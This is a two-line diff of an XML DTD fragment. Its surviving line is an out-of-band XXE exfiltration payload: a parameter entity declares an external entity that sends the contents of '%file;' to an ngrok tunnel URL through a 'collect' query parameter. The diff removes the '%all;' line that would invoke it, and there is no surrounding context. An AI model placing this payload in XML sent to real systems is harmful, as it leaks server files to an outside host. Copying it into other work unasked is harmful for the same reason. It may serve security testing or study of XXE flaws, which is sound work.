@@ -1,2 +1,1 @@
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://b4d3bd27.ngrok.io/?collect=%file;'>">
-%all;
